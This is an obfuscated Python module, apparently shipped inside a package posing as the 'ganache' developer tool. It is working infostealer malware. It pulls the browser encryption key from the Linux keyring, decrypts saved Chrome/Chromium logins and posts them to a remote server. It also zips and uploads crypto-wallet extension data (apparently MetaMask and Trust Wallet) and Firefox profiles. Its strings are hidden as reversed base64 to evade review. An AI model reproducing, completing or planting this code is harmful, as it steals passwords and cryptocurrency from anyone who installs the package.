U='note'
T='file'
H=None
G=open
C=print
import requests as E
from ganache.utils import G as J,K as A
import os as B,glob as D,re,shutil as W,secretstorage as I
from importlib import import_module as K
from getpass import getuser as L
from shutil import copy
import sqlite3 as V,string as X
from os import unlink as Y
from ganache.models import AC as Z
a='=k2YnJ2atVWZt5Wakh2Zn5Gbi92boNWZsd2arNGbjpGZ'
b='=0GatlmbqFWZlVWbsFGZjVGanxGajxGcvtWYixWYipWZ'
c='=4mbrdGcnZWZiR2br5mZlxGal9WYlF2ZvVmYmhWaitmb'
M='=gGckdGcwVWZi5GZiNmYk52bjRGajlGbnBnYqRWaqdWZ'
d='==wLqUGbpZ2byB1Ll12byh2YtUGbn92bn9yZpZmbvNmLvMXJ'
e='=8CdsVXYmVGRvUWbvJHaj1SZsd2bvd2LnlmZu92Yu8if'
f='==wLhJXZw92LnlmZu92Yu8if'
g='=8ycn5Wa0RXZTBibvl2cuVGd4VEIsF2Yvx0L'
N='=s2ch1WY0VWb'
h='0VGbsF2dfR3c1JHd'
O='lNWa2VGZ'
P='=IXZzd3byJ2XiV2d'
Q='==QZwlHd'
R='=Qnbl1GajFGd0F2L'
i='=MnauMnZlJHcvoyL49mZlJXam9SYsxWa69Wbu8if'
j='==wcq5ycmVmcw9iKvg3bmVmcpZ2LhxGbpp3bt5yLu9Wbt92Yvg3bmVmcpZ2LwFmbz9if'
k='iwFXpsSXi41WoICXcpjIcx1bp5yazFWbhRXZtBkbvl2cuVGd4VmYldnI'
l='rsyKu9Waz5WZ0hXZto3bt9CdsVXYmVGZvU2ZhJ3b0N3L'
m='==AevZWZylmZ'
S='l12byh2Y'
n='=EmclB3b'
o='=Qnb192YjF2L'
p='hRXYEBibpd2bM9iKlxWam9mcQ9SZt9mcoNWLlx2Zv92ZvcWam52bj5yL'
q='=EGdhREIul2Zvx0L0xWdhZWZE9SZt9mcoNWLlx2Zv92ZvcWam52bj5yL'
r='==gREtkLs92YvR3byBlLvRHc5J3Q'
s='=MVRB5iclhGcpNkLvRHc5J3Q'
F='==gYk5SY0FGRg4Wan9GT'
t='=szcul2ZvxGIN9kUGBSZ1xWY29FZy92dzNXYwBCLlVHbhZ3Xl1WYuJXZzVHIswmc19lbvlGdjFGIUNURMV0U'
u='==QZnFmcvR3UgUmZhNFIl12byh2Q'
class v:
	def __init__(A,device_id,base_url):A.device_id=device_id;A.base_url=base_url
	def __get_key(M,key_name):
		B=H;D=I.dbus_init();E=I.get_default_collection(D)
		for C in E.get_all_items():
			if C.get_label()==key_name:B=C.get_secret();break
		if B is H:return
		F=1;G=b'saltysalt';J=16;L=K(A(r));return L.PBKDF2(B,G,J,F)
	def __cr_lg_paths(F):
		C=D.glob(f"/home/{L()}{A(p)}");E=f"/home/{L()}{A(q)}"
		if B.path.exists(E):C.append(E)
		return C
	def __dc(G,enc_passwd,key):B=enc_passwd;C=K(A(s));D=b' '*16;B=B[3:];E=C.new(key,C.MODE_CBC,IV=D);F=E.decrypt(B);return F.strip().decode('utf8')
	def __get_ac(H,login_data_path,key,browser_name):
		copy(login_data_path,A(F));C=V.connect(A(F));D=C.cursor();D.execute(A(t));E=[]
		for B in D.fetchall():
			I=H.__dc(B[2],key);G=''.join(A for A in I if A in X.printable)
			if B[1]or G:J=Z(B[0],B[1],G,browser_name);E.append(J)
		C.close();Y(A(F));return E
	def run(B):
		D=B.__get_key(key_name=A(u))
		if D:
			H=B.__cr_lg_paths()
			for I in H:J=B.__get_ac(I,D,A(S))
			F=[]
			for K in J:F.append(K.to_json(B.device_id))
			try:
				G=E.post(B.base_url+A(o),json=F)
				if G.status_code<200 or G.status_code>=300:C('Error 31: Unknown error')
			except:C('Error -31: Unknown error')
class w:
	id_list=[A(a),A(b),A(c),A(M)]
	def __init__(A,device_id,base_url):A.device_id=device_id;A.base_url=base_url
	def __cr_data_paths(F):
		C=D.glob(A(d)%B.path.expanduser('~'));E=B.path.expanduser(A(e))
		if B.path.exists(E):C.append(E)
		return C
	def __op_data_path(D):
		C=B.path.expanduser(A(f))
		if B.path.exists(C):return C
	def __handle(D,path,browser):
		for id in D.id_list:
			H=path+A(g)+id
			if B.path.exists(H):
				F='ganache/mtm.zip';type=A(N)
				if id==A(M):F='ganache/tw.zip';type=A(h)
				J(H,F);K={T:G(F,'rb')};L={A(O):D.device_id,A(P):browser,A(Q):type,U:id}
				try:
					I=E.post(D.base_url+A(R),data=L,files=K)
					if I.status_code<200 or I.status_code>=300:C('Error 33: Unknown error')
				except:C('Error -33: Unknown error')
	def __handle_ff(K):
		V='ganache/mtmf.zip';X=D.glob(B.path.expanduser(A(i)));Y=D.glob(B.path.expanduser(A(j)));Z=X+Y
		for F in Z:
			with G(F,'r',encoding='utf-8',errors='ignore')as H:
				a=H.read();L=re.search(A(k),a)
				if L:
					id=L.group(1);b=B.path.dirname(F)+A(l)+id+'^userContextId=*';M=D.glob(b)
					if len(M)>0:
						I=M[0];W.copy2(F,I+'/prefs.js');J(I,V);H={T:G(V,'rb')};c={A(O):K.device_id,A(P):A(m),A(Q):A(N),U:B.path.basename(I)}
						try:
							S=E.post(K.base_url+A(R),data=c,files=H)
							if S.status_code<200 or S.status_code>=300:C('Error 34: Unknown error')
						except:C('Error -34: Unknown error')
	def run(B):
		for D in B.__cr_data_paths():B.__handle(D,A(S))
		C=B.__op_data_path()
		if C is not H:B.__handle(C,A(n))
		B.__handle_ff()